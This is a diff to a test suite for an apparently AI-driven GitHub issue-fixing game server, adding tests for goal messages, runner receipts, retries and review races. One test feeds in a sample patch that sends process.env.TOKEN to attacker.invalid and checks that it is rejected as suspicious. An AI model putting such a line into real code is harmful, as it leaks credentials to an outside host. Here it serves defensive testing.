@@ -1,7 +1,9 @@
-import { authorizedSocket, browserEnv, browserCookies } from "./browser-fixture";
+import { credentialEnv } from "./credential-fixture";
+import { authorizedDB, membershipCache, authorizedSocket, browserEnv, browserCookies } from "./browser-fixture";
 import { describe, expect, it, mock } from "bun:test";
 import { FactoryState, type Item } from "@shiptorio/shared";
 import { starterLine } from "../src/engine";
+import { freshInspection, setStage, stageOf } from "../src/gauntlet";
 import { normalizeGitHub } from "../src/sources/github";
 
 // Exercise the real Factory transitions with storage and transport substitutes.
@@ -28,27 +30,69 @@ function fixture(items: Item[] = [], extraEnv: Record<string, unknown> = {}) {
   };
   let exclusive: Promise<unknown> = Promise.resolve();
   const ctx = { storage, blockConcurrencyWhile: <T>(fn: () => Promise<T>) => { const next = exclusive.then(fn); exclusive = next.catch(() => {}); return next; }, getWebSockets: () => [authorizedSocket((raw: string) => events.push(JSON.parse(raw)))] };
-  const env = { ...browserEnv, DB: { prepare: () => ({ bind: () => ({ run: async () => ({ success: true }), all: async () => ({ results: [] }) }) }) }, ...extraEnv };
-  const factory = new Factory(ctx as never, env as never);
-  return { factory, data, events, reload: () => new Factory(ctx as never, env as never), saved: () => data.get("state") as FactoryState };
+  const env = { ...browserEnv, CACHE: membershipCache, DB: { prepare: () => ({ bind: () => ({ run: async () => ({ success: true }), all: async () => ({ results: [] }) }) }) }, ...extraEnv };
+  const factory = new Factory(ctx as never, credentialEnv({ ...env, DB: authorizedDB(env.DB), CACHE: membershipCache }) as never);
+  return { factory, data, events, alarm: () => alarm, reload: () => new Factory(ctx as never, credentialEnv({ ...env, DB: authorizedDB(env.DB), CACHE: membershipCache }) as never), saved: () => data.get("state") as FactoryState };
 }
 
-const item = (overrides: Partial<Item> = {}): Item => ({ id: "gh-1", kind: "bug", source: "github_issue", title: "Fix checkout", district: "/", state: "on_pad", attempts: 1, prNumber: 42, updatedAt: 1, ...overrides });
+const item = (overrides: Partial<Item> = {}): Item => ({ id: "gh-1", kind: "bug", source: "github_issue", title: "Fix checkout", district: "/", state: "on_pad", attempts: 1, prNumber: 42, updatedAt: Date.now(), ...overrides });
 
 describe("Factory lifecycle", () => {
+  it("broadcasts and persists exact player goals across Factory reloads, including clearing", async () => {
+    const f = fixture();
+    for (const goal of ["  Ship checkout fixes\nwithout regressions  ", "g".repeat(200), ""]) {
+      f.events.length = 0;
+      await f.factory.webSocketMessage(authorizedSocket(), JSON.stringify({ type: "set_goal", text: goal }));
+      expect(f.events).toContainEqual({ type: "patch", patch: { goal } });
+      expect(f.saved().goal).toBe(goal);
+      // A fresh instance must read the durable value, not the previous instance's cache.
+      const reloaded = f.reload() as unknown as { load(): Promise<FactoryState | null> };
+      expect((await reloaded.load())?.goal).toBe(goal);
+    }
+  });
+  it("rejects invalid or unauthorized goal messages without saving or broadcasting", async () => {
+    const f = fixture();
+    f.data.set("state", { ...f.saved(), goal: "Keep the existing goal" });
+    await (f.factory as unknown as { load(): Promise<FactoryState | null> }).load();
+    const before = structuredClone(f.saved());
+    for (const raw of [
+      "not JSON",
+      JSON.stringify({ type: "set_goal" }),
+      JSON.stringify({ type: "set_goal", text: null }),
+      JSON.stringify({ type: "set_goal", text: 42 }),
+      JSON.stringify({ type: "set_goal", text: "g".repeat(201) }),
+      JSON.stringify({ type: "set_goal", text: "Valid goal", padding: " ".repeat(16384) }),
+      new ArrayBuffer(8),
+    ]) {
+      await f.factory.webSocketMessage(authorizedSocket(), raw);
+      expect(f.saved()).toEqual(before);
+      expect(f.events).toEqual([]);
+    }
+    const unauthorized = authorizedSocket();
+    unauthorized.serializeAttachment(null);
+    const closed: unknown[][] = [];
+    unauthorized.close = (...args) => { closed.push(args); };
+    await f.factory.webSocketMessage(unauthorized, JSON.stringify({ type: "set_goal", text: "Unauthorized change" }));
+    expect(closed).toEqual([[1008, "Sign in again"]]);
+    expect(f.saved()).toEqual(before);
+    expect(f.events).toEqual([]);
+  });
   it("runs Spark planning, exclusive runner claim, scoped branch verification and idempotent PR receipts", async () => {
     const keys = await crypto.subtle.generateKey({ name: "RSASSA-PKCS1-v1_5", modulusLength: 2048, publicExponent: new Uint8Array([1, 0, 1]), hash: "SHA-256" }, true, ["sign", "verify"]);
     const der = await crypto.subtle.exportKey("pkcs8", keys.privateKey);
     const pem = `-----BEGIN PRIVATE KEY-----\n${Buffer.from(der).toString("base64")}\n-----END PRIVATE KEY-----`;
     const originalFetch = globalThis.fetch;
     const base = "a".repeat(40), head = "b".repeat(40);
+    let receiptPatch: string | undefined = "-old\n-old2\n+fixed\n+test";
     let opened = 0, sparkCalls = 0, merged = false, browserPlanning = false, browserCall = 0;
     let onFeedbackRead: (() => Promise<void>) | undefined;
     globalThis.fetch = (async (input: string | URL | Request, init?: RequestInit) => {
       const url = String(input);
+      if (/\/comments\?per_page=100&page=/.test(url) && !url.includes("/issues/1/comments?")) return Response.json([]);
+      if (url.endsWith("/comments")) return Response.json({ id: 1 });
       const json = (value: unknown) => Response.json(value);
       if (url.endsWith("/access_tokens")) return json({ token: "fake-install-token" });
-      if (url.endsWith("/chat/completions") && String(init?.body).includes("game master")) { const brief = JSON.parse(JSON.parse(String(init?.body)).messages[1].content); return json({ choices: [{ message: { content: JSON.stringify({ order: brief.cards.map((c: { id: string }) => c.id), reason: "Oldest jam first.", picks: {} }) } }] }); }
+      if (url.endsWith("/chat/completions") && String(init?.body).includes("game master")) { const brief = JSON.parse(JSON.parse(JSON.parse(String(init?.body)).messages[1].content.split("\n")[1])); return json({ choices: [{ message: { content: JSON.stringify({ order: brief.cards.map((c: { id: string }) => c.id), reason: "Oldest jam first.", picks: {} }) } }] }); }
       if (url.endsWith("/chat/completions") && browserPlanning) {
         browserCall++;
         const action = browserCall === 1 ? { files: ["server/src/engine.ts", "shared/src/protocol.ts"] } : browserCall === 2 ? { tool: "read_issue", reason: "Understand issue" } : browserCall === 3 ? { tool: "read_file", path: "shared/src/protocol.ts", reason: "Read reference schema without editing it" } : { tool: "assign_job", files: ["server/src/engine.ts"], reason: "Ready for player review", plan: "Add direnv coverage to the existing guard.", acceptance: ["Reject .envrc"] };
@@ -60,7 +104,7 @@ describe("Factory lifecycle", () => {
       if (url.includes("/git/trees/")) return json({ sha: "tree-is-not-commit", tree: [{ path: "server/src/engine.ts", type: "blob" }, { path: "shared/src/protocol.ts", type: "blob" }], truncated: false });
       if (url.endsWith("/git/ref/heads/main")) return json({ object: { sha: base } });
       if (url.includes("/git/ref/heads/shiptorio/")) return json({ object: { sha: head } });
-      if (url.includes("/compare/")) return json({ status: "ahead", ahead_by: 1, files: [{ filename: "server/src/engine.ts", status: "modified", changes: 4 }] });
+      if (url.includes("/compare/")) return json({ status: "ahead", ahead_by: 1, files: [{ filename: "server/src/engine.ts", status: "modified", changes: 4, patch: receiptPatch }] });
       if (url.endsWith("/pulls/99")) return json({ head: { sha: head }, merged });
       if (url.includes("/issues/1/comments?")) { const hook = onFeedbackRead; onFeedbackRead = undefined; await hook?.(); return json([]); }
       if (url.endsWith("/issues/1/comments") && init?.method === "POST") return json({ id: 200 });
@@ -92,6 +136,13 @@ describe("Factory lifecycle", () => {
       const receipt = { jobId: job.id, lease: assigned.lease!, ok: true, sha: head, summary: "Fixed with regression coverage", checks: ["typecheck", "test", "build"] as const };
       await expect(f.factory.finishRunner(pair, { ...receipt, checks: [] })).rejects.toThrow("check receipts");
       await expect(f.factory.finishRunner(pair, { ...receipt, sha: base, checks: [...receipt.checks] })).rejects.toThrow("head mismatch");
+      const safePatch = receiptPatch;
+      receiptPatch = undefined;
+      await expect(f.factory.finishRunner(pair, { ...receipt, checks: [...receipt.checks] })).rejects.toThrow("complete patch");
+      receiptPatch = "+fetch('https://attacker.invalid', { body: process.env.TOKEN });\n+test\n-old\n-old2";
+      await expect(f.factory.finishRunner(pair, { ...receipt, checks: [...receipt.checks] })).rejects.toThrow("Suspicious diff");
+      expect(opened).toBe(0);
+      receiptPatch = safePatch;
       const result = await f.factory.finishRunner(pair, { ...receipt, checks: [...receipt.checks] });
       expect(result.prUrl).toEndWith("/99");
       await f.factory.onCheckSuite([], true, "unrelated", base);
@@ -273,3 +324,159 @@ it("offers local runner plans only for real GitHub issues and refuses source-onl
     expect(await f.factory.runnerJobs()).toEqual([]);
   }
 });
+
+it('watchdog survives restart, offers one scar/card, and alarm always recovers from a broken tick', async () => {
+  const f = fixture([item({ state: 'working', prNumber: undefined, updatedAt: Date.now() - 31 * 60000 })]);
+  await f.factory.alarm();
+  expect(f.saved().items[0].scars?.map(s => s.reason)).toEqual(['stuck at working']);
+  expect(f.saved().deck?.some(m => m.id.startsWith('stuck:'))).toBe(true);
+  await f.reload().alarm();
+  expect(f.saved().items[0].scars).toHaveLength(1);
+  const broken = f.reload();
+  (broken as unknown as { pollPostHog: () => Promise<void> }).pollPostHog = async () => { throw new Error('one bad poll'); };
+  await broken.alarm();
+  expect(f.data.has('reliabilityFailure:pollPostHog')).toBe(true);
+  expect(f.alarm()).toBeGreaterThan(Date.now());
+  expect(f.alarm()).toBeLessThanOrEqual(Date.now() + 60000);
+  expect(f.saved().deck?.some(m => m.id === 'reliability:pollPostHog')).toBe(true);
+});
+
+it('completed DO delivery tombstones prevent replay even when D1 intake raced', async () => {
+  const f = fixture();
+  let calls = 0;
+  const internals = f.factory as unknown as { handleGitHub: () => Promise<void> };
+  internals.handleGitHub = async () => { calls++; };
+  await f.factory.enqueueGitHub('same-delivery', 'unknown', {});
+  await f.factory.alarm();
+  await f.factory.enqueueGitHub('same-delivery', 'unknown', {});
+  await f.factory.alarm();
+  expect(calls).toBe(1);
+  expect(f.data.get('done:delivery:same-delivery')).toBeGreaterThan(Date.now());
+});
+
+it('exhausted deliveries leave a durable dead letter and player card while later work continues', async () => {
+  const f = fixture();
+  const internals = f.factory as unknown as { handleGitHub: (event: string) => Promise<void> };
+  let healthy = 0;
+  internals.handleGitHub = async event => { if (event === 'bad') throw new Error('bad payload'); healthy++; };
+  await f.factory.enqueueGitHub('broken', 'bad', {});
+  for (let i = 0; i < 5; i++) {
+    const pending = f.data.get('delivery:broken') as Record<string, unknown> | undefined;
+    if (pending) pending.nextAt = 0;
+    await f.factory.alarm();
+  }
+  await f.factory.enqueueGitHub('healthy', 'good', {});
+  await f.factory.alarm();
+  expect(f.data.has('failed:delivery:broken')).toBe(true);
+  expect(f.data.has('delivery:broken')).toBe(false);
+  expect(f.saved().deck?.some(m => m.id === 'failed:delivery:broken')).toBe(true);
+  expect(healthy).toBe(1);
+  await f.factory.enqueueGitHub('broken', 'bad', {});
+  expect(f.data.has('delivery:broken')).toBe(false);
+});
+
+it('reconciliation repairs missed merge, close, moved head and check-run events independently', async () => {
+  const keys = await crypto.subtle.generateKey({ name: 'RSASSA-PKCS1-v1_5', modulusLength: 2048, publicExponent: new Uint8Array([1, 0, 1]), hash: 'SHA-256' }, true, ['sign', 'verify']);
+  const pem = `-----BEGIN PRIVATE KEY-----\n${Buffer.from(await crypto.subtle.exportKey('pkcs8', keys.privateKey)).toString('base64')}\n-----END PRIVATE KEY-----`;
+  const f = fixture([1, 2, 3, 4].map(n => item({ id: `gh-${n}`, prNumber: n, state: 'inspecting', branch: 'shiptorio/runner-test', inspection: { headSha: 'old', state: 'pending', humanApproved: false, stages: [{ gate: 'ci', state: 'pending', reason: 'waiting' }, { gate: 'verify', state: 'pending', reason: 'waiting' }, { gate: 'ai', state: 'pending', reason: 'waiting' }, { gate: 'human', state: 'pending', reason: 'waiting' }] } })), { GITHUB_APP_ID: '1', GITHUB_APP_PRIVATE_KEY: pem });
+  f.data.set('reconcileAt', 0);
+  let publicationRecovery = false;
+  const original = globalThis.fetch;
+  globalThis.fetch = (async (input: unknown) => {
+    const url = String(input);
+    if (url.includes('/pulls?state=all')) return Response.json(publicationRecovery ? [{ number: 1, html_url: 'https://github.com/r3dbars/demo/pull/1', state: 'closed', merged_at: '2026-10-26', head: { ref: 'shiptorio/runner-old', sha: 'old' } }] : []);
+    if (url.endsWith('/access_tokens')) return Response.json({ token: 'test' });
+    if (url.includes('/check-runs?')) return Response.json({ total_count: 1, check_runs: [{ name: 'CI', status: 'completed', conclusion: 'success' }] });
+    if (url.includes('/status?')) return Response.json({ total_count: 0, statuses: [] });
+    if (url.includes('/files?')) return Response.json([{ filename: 'server/src/engine.ts' }]);
+    const n = Number(url.split('/').at(-1));
+    return Response.json({ state: n < 3 ? 'closed' : 'open', merged: n === 1, head: { sha: n === 3 ? 'new' : 'old' }, merge_commit_sha: 'merged' });
+  }) as typeof fetch;
+  try {
+    await (f.factory as unknown as { load: () => Promise<boolean> }).load();
+    await (f.factory as unknown as { reconcileGitHub: () => Promise<void> }).reconcileGitHub();
+    expect(f.saved().items.find(i => i.id === 'gh-1')?.state).toBe('launched');
+    expect(f.saved().items.some(i => i.id === 'gh-2')).toBe(false);
+    expect(f.saved().items.find(i => i.id === 'gh-3')?.inspection?.headSha).toBe('new');
+    expect(f.saved().items.find(i => i.id === 'gh-4')?.inspection?.stages[0].state).toBe('passed');
+    expect(f.saved().science.red).toBe(1);
+    f.data.set('reconcileAt', 0);
+    await (f.factory as unknown as { reconcileGitHub: () => Promise<void> }).reconcileGitHub();
+    expect(f.saved().science.red).toBe(1);
+    // An old published PR must not attach itself to fresh ore after orbit reopens it.
+    publicationRecovery = true;
+    const live = (f.factory as unknown as { state: FactoryState }).state;
+    live.items = [{ ...live.items[0], state: "queued", prNumber: undefined, prUrl: undefined }];
+    f.data.set('runnerJob:old-publication', { id: 'old-publication', itemId: 'gh-1', repo: 'r3dbars/demo', branch: 'shiptorio/runner-old', status: 'completed' });
+    f.data.set('reconcileAt', 0);
+    await (f.factory as unknown as { reconcileGitHub: () => Promise<void> }).reconcileGitHub();
+    expect(live.items[0].prNumber).toBeUndefined();
+    expect(live.items[0].state).toBe('queued');
+  } finally { globalThis.fetch = original; }
+});
+
+
+it('does not retry a durable delivery before its persisted backoff deadline', async () => {
+  const f = fixture();
+  let calls = 0;
+  (f.factory as unknown as { handleGitHub: () => Promise<void> }).handleGitHub = async () => { calls++; throw new Error('unavailable'); };
+  await f.factory.enqueueGitHub('backoff', 'bad', {});
+  await f.factory.alarm();
+  await f.factory.alarm();
+  expect(calls).toBe(1);
+  const pending = f.data.get('delivery:backoff') as { nextAt: number };
+  expect(pending.nextAt).toBeGreaterThan(Date.now());
+});
+
+
+for (const outcome of ["pass", "error", "comment"] as const) {
+  it(`discards an old-head AI review when the head moves during ${outcome === "comment" ? "comment publication" : outcome === "error" ? "a failed review" : "review"}`, async () => {
+    const keys = await crypto.subtle.generateKey({ name: "RSASSA-PKCS1-v1_5", modulusLength: 2048, publicExponent: new Uint8Array([1, 0, 1]), hash: "SHA-256" }, true, ["sign", "verify"]);
+    const pem = `-----BEGIN PRIVATE KEY-----\n${Buffer.from(await crypto.subtle.exportKey("pkcs8", keys.privateKey)).toString("base64")}\n-----END PRIVATE KEY-----`;
+    const oldHead = "b".repeat(40), newHead = "c".repeat(40);
+    const reviewing = (sha: string) => setStage(setStage(item({ state: "inspecting", branch: "shiptorio/runner-1", inspection: freshInspection(sha) }), "ci", "passed", "green"), "verify", "passed", "proof");
+    const f = fixture([reviewing(oldHead)], { GITHUB_APP_ID: "1", GITHUB_APP_PRIVATE_KEY: pem, META_API_KEY: "test" });
+    const internals = f.factory as unknown as { load(): Promise<unknown>; runGauntlet(): Promise<void>; patch(patch: { items: Item[] }): Promise<void>; think: (...args: unknown[]) => Promise<unknown> };
+    let release!: () => void, started!: () => void;
+    const waiting = new Promise<void>(resolve => { release = resolve; });
+    const entered = new Promise<void>(resolve => { started = resolve; });
+    const comments: string[] = [];
+    const original = globalThis.fetch;
+    globalThis.fetch = (async (input: unknown, init?: RequestInit) => {
+      const url = String(input);
+      if (url.includes("/comments?")) return Response.json([]);
+      if (url.endsWith("/access_tokens")) return Response.json({ token: "test" });
+      if (url.includes("/files?")) return Response.json([{ filename: "server/src/cart.ts", status: "modified", patch: "-old\n+fixed" }]);
+      if (url.endsWith("/issues/42/comments")) {
+        comments.push(JSON.parse(String(init?.body)).body);
+        if (outcome === "comment") { started(); await waiting; }
+        return Response.json({ id: 1 });
+      }
+      throw new Error(`Unexpected request ${url}`);
+    }) as typeof fetch;
+    internals.think = async () => {
+      if (outcome !== "comment") { started(); await waiting; }
+      if (outcome === "error") throw new Error("Old review failed");
+      return { verdict: "pass", reason: "Old diff is correct", findings: [] };
+    };
+    try {
+      await internals.load();
+      const run = internals.runGauntlet();
+      await entered;
+      // A new head has completed CI and proof while the previous review is still awaiting I/O.
+      await internals.patch({ items: [reviewing(newHead)] });
+      release();
+      await run;
+      expect(f.saved().items[0].inspection?.headSha).toBe(newHead);
+      expect(stageOf(f.saved().items[0], "ai")?.state).toBe("pending");
+      expect(f.saved().items[0].state).toBe("inspecting");
+      expect(f.saved().items[0].scars ?? []).toHaveLength(0);
+      expect(comments).toHaveLength(outcome === "comment" ? 1 : 0);
+      if (comments.length) expect(comments[0]).toContain(`shiptorio-review-head:${oldHead}`);
+      // The replacement commit still receives its own review on the next run.
+      await internals.runGauntlet();
+      expect(stageOf(f.saved().items[0], "ai")?.state).toBe(outcome === "error" ? "rework" : "passed");
+      if (outcome !== "error") expect(comments.at(-1)).toContain(`shiptorio-review-head:${newHead}`);
+    } finally { release(); globalThis.fetch = original; }
+  });
+}
